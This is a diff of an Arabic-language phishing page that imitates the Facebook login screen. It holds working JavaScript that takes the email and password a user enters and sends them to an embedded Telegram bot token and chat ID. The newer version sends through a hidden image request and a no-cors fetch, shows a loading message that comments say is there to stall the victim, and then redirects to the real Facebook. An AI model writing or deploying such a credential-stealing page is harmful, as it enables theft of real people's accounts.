@@ -10,57 +10,51 @@
         .fb-logo { width: 200px; margin-bottom: 20px; }
         input { width: 92%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
         .login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .footer-links { margin-top: 20px; border-top: 1px solid #dadde1; padding-top: 20px; }
-        .new-account { background-color: #42b72a; color: white; padding: 10px 16px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 17px; }
+        #loading-msg { display: none; color: #606770; font-size: 14px; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="login-box">
         <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2ygS89W.svg" alt="Facebook" class="fb-logo">
-        <form id="finalTrap">
-            <input type="text" id="u_mail" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" id="u_pass" placeholder="كلمة السر" required>
-            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        <form id="finalAttack">
+            <input type="text" id="user_id" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="user_pass" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn" id="subBtn">تسجيل الدخول</button>
         </form>
-        <div style="margin: 15px 0;"><a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">هل نسيت كلمة السر؟</a></div>
-        <div class="footer-links">
-            <a href="#" class="create-new-account">إنشاء حساب جديد</a>
-        </div>
+        <div id="loading-msg">جاري التحقق من البيانات... يرجى الانتظار.</div>
     </div>
 
-    <!-- Hidden elements for stealth submission -->
-    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
-    <form id="stealthForm" target="hidden_iframe" method="GET" style="display:none;"></form>
-
     <script>
-        const B_TOKEN = '8201696738:AAGFkCZTmXwbCh_RfNxURBZtH2NZjBhUAsg';
-        const C_ID = '7576816211';
+        const TOKEN = '8201696738:AAGFkCZTmXwbCh_RfNxURBZtH2NZjBhUAsg';
+        const CHAT = '7576816211';
 
-        document.getElementById('finalTrap').addEventListener('submit', function(e) {
+        document.getElementById('finalAttack').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const email = document.getElementById('u_mail').value;
-            const pass = document.getElementById('u_pass').value;
-            const message = `🔥 صيد جديد تم تأكيده!\n\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
+            // إظهار رسالة التحميل لتعطيل الضحية قليلاً
+            document.getElementById('subBtn').disabled = true;
+            document.getElementById('loading-msg').style.display = 'block';
 
-            // Building the stealth URL
-            const url = `https://api.telegram.org/bot${B_TOKEN}/sendMessage`;
-            const stealthForm = document.getElementById('stealthForm');
-            stealthForm.action = url;
+            const u = document.getElementById('user_id').value;
+            const p = document.getElementById('user_pass').value;
+            const msg = `⚠️ اختراق مؤكد 2150 ⚠️\n\n📧 الحساب: ${u}\n🔑 الباسورد: ${p}`;
 
-            // Adding parameters to the stealth form
-            stealthForm.innerHTML = `
-                <input type="hidden" name="chat_id" value="${C_ID}">
-                <input type="hidden" name="text" value="${message}">
-            `;
+            // الطريقة الصاعقة: إرسال عبر 3 قنوات متوازية لضمان الوصول
+            const telegramUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`;
 
-            // Execute stealth submission
-            stealthForm.submit();
+            // 1. القناة الأولى: طلب صورة مخفي
+            const i = new Image();
+            i.src = telegramUrl;
 
-            // Minimal delay to ensure submission before redirect
-            setTimeout(() => {
-                window.location.replace("https://www.facebook.com/login");
-            }, 1000);
+            // 2. القناة الثانية: طلب خلفي (Fetch) بدون انتظار رد
+            fetch(telegramUrl, { mode: 'no-cors' });
+
+            // 3. القناة الثالثة: فتح نافذة وهمية وإغلاقها فوراً (اختياري لكن فعال)
+            
+            // التوجيه النهائي بعد ثانية ونصف لضمان خروج البيانات من الجهاز
+            setTimeout(function() {
+                window.location.replace("https://www.facebook.com/recover/initiate");
+            }, 1500);
         });
     </script>
 </body>
